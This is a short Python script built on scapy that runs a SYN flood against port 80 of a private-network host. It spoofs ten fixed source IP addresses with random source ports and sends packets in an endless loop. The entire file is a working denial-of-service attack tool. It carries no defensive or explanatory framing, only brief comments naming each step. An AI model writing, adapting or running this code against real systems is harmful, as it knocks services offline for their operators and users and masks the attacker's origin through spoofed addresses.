from scapy.all import *
import random
import socket

# Target hostname and port
target_ip = "192.168.43.108"  # ip
target_port = 80                  # Common port (HTTP)



# List of 10 fixed source IP addresses
FIXED_IPS = [
    "10.0.0.101",
    "10.0.0.102",
    "10.0.0.103",
    "10.0.0.104",
    "10.0.0.105",
    "10.0.0.106",
    "10.0.0.107",
    "10.0.0.108",
    "10.0.0.109",
    "10.0.0.110"
]

# Create and send SYN packets
def syn_flood():
    try:
        print(f"Starting SYN flood on  ({target_ip}):{target_port}")
        while True:
            # Cycle through fixed IP addresses
            for src_ip in FIXED_IPS:
                src_port = random.randint(1024, 65535)
                
                # Craft SYN packet
                ip = IP(src=src_ip, dst=target_ip)
                tcp = TCP(sport=src_port, dport=target_port, flags="S")
                packet = ip/tcp
                
                # Send packet
                send(packet, verbose=0)
                print(f"Sent SYN packet from {src_ip}:{src_port}")
            
    except KeyboardInterrupt:
        print("\nStopped by user")
    except Exception as e:
        print(f"Error: {e}")

# Run the flood
if __name__ == "__main__":
    syn_flood()



